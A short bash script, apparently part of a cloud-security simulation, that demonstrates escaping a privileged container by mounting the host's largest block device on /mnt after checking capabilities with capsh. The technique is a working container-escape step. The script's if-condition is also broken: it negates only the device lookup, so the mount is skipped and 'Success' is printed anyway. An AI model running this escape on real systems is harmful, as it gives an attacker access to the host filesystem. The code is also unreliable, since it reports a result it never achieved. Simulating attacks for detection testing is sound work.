#!/bin/bash

# Define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
BLUE="\e[34m"
CYAN="\e[36m"
RESET="\e[0m"

# Escape to Host Technique
echo -e "${CYAN}\n>>> [Privilege Escalation][Common] Escape to Host Technique ${RESET}"
echo -e "${YELLOW}> Let's simulate the case when an attacker mounts root host file system. Container must be privileged or have CAP_SYS_ADMIN capability ${RESET}"
echo -e "${BLUE}> https://github.com/aliaksxssv/cloud-security-cheatsheet/blob/main/06%20Privilege%20Escalation/Escape%20to%20Host.md ${RESET}"

echo -e "${YELLOW}> Getting available Linux capabilities ... ${RESET}"
capsh --print | grep "Bounding set"

echo -e "${YELLOW}> Trying to mount root host file system ... ${RESET}"
if ! device=$(lsblk -o NAME,SIZE -d | sort -k2 -h | tail -n 1 | awk '{print $1}') && mount /dev/$device /mnt/; then
        echo -e "${RED}Error! Mount of root host file system was failed ${RESET}"
    else
        echo -e "${GREEN}Success! The root host file system was mounted ${RESET}"
fi
